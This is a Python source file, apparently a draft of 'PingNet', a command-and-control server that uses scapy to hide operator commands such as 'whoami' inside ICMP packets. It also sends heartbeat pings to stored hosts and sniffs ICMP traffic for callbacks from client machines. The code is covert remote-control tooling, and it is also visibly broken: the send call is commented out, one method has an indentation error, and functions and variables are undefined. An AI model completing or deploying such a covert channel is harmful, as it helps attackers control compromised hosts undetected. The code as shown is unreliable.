from scapy.all import *
import csv
import sys
import threading
import random
from db import Connector

class Server:
    def __init__(self):
        self.verbose = False
        self.db = Connector()
        with open("test.txt") as file:
            csv_reader = csv.reader(file, delimiter=',')
            for row in csv_reader:
                print(row)

    def shell(self):
        global verbose
        print("Welcome to PingNet")
        while True:
            cmd = input("Pingnet:")
            if cmd == "exit":
                print("Closing")
                break
            elif cmd == "help":
                print("\nPingnet Help\ncallbacks(NI) - view all systems that have beat back\nexit - exits ping net\nhelp - Displays this help menu\nlookup <team number(NI) or specific device> - Lookup infomration on a specific device\nlist(NI) - list all of the stored systems\nsend - Enters the send prompts to send either files(not implemented) or commands to the client device\n")
            elif cmd == "lookup":
                lookup = input("What information to pull:")
                try:
                    print(iplook(lookup))#Fix this to use the database instead
                except IndexError:
                    print("Out of bounds")
                except ValueError:
                    print("Why a negative number")
            elif cmd == "send":
                self.send_cmd()
            elif cmd == "file":
                id = input("Target: ")
                file_transfer(input("What File would you like to send:"), iplook(id))#Fix this to use the database
            elif cmd == "test":
                print("THis is only for testing fuctionality of class not actual control")
                self.sender("11", "whoami", "44", "3")
            else:
                print("Invalid command")

    def sender(self, dest, cmd, protype, protcode):
        print("DEST")
        #rpckt = sr1(IP(dst=self.iplook(dest))/ICMP(type=protype, code=protcode)/cmd)#Fix this to use the database instead

    def send_cmd(self):
        #typ = random.randint(44,94)
        typ = 44
        target = input("Target:")
        code = input("Cmd Processor")
        cmd =  input("Command:")
        self.sender(target, cmd, typ, code)

    def heartbeat(self):
        ips = self.db.heart_ips_test()
        for ip in ips:
            print(ip[0])
            typ = 146
            code = 0
            self.sender(ip, "abcdefghijklmnopqrstuvwxyz",typ,code)
    
    def file_transfer(self, fname):
        with open(fname, "rb") as fsend:
            data = f.read()
            print(data)
    
    def encryptor(self):
        pass #This is necessary

    def sniffer(self):
    sniff(filter="icmp", prn=resp_mgmt)
    # These packets will come in periodically. The heartbeat will just have 1pkt that will have the str hb

    def resp_mgmt(self, pkt, type):
        if str(pkt.getlayer(ICMP).type) == "146":
            if str(pkt.getlayer(ICMP).code) == "1":
                print("Heartbeat Recieved")
        print(pkt.show())
        print(pkt.getlayer(ICMP).type)
        data = pkt.getlayer(ICMP).load.decode()
        print(data[1::])

server = Server()
server.heartbeat()